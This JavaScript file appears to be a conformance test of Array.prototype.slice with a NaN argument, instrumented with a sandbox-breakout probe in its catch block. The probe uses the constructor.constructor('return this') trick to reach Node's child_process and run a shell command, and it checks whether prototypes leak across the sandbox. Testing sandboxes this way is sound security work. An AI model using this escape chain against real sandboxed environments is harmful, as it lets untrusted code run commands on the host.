try {
    var x = [
        0,
        1,
        2,
        3,
        4
    ];
    var arr = x.slice(NaN, 3);
    arr.getClass = Object.prototype.toString;
    if (arr.getClass() !== '[object ' + 'Array' + ']') {
        $ERROR('#1: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr is Array object. Actual: ' + arr.getClass());
    }
    if (arr.length !== 3) {
        $ERROR('#2: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr.length === 3. Actual: ' + arr.length);
    }
    if (arr[0] !== 0) {
        $ERROR('#3: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr[0] === 0. Actual: ' + arr[0]);
    }
    if (arr[1] !== 1) {
        $ERROR('#4: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr[1] === 1. Actual: ' + arr[1]);
    }
    if (arr[2] !== 2) {
        $ERROR('#5: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr[2] === 2. Actual: ' + arr[2]);
    }
    if (arr[3] !== undefined) {
        $ERROR('#6: var x = [0,1,2,3,4]; var arr = x.slice(NaN,3); arr[3] === undefined. Actual: ' + arr[3]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}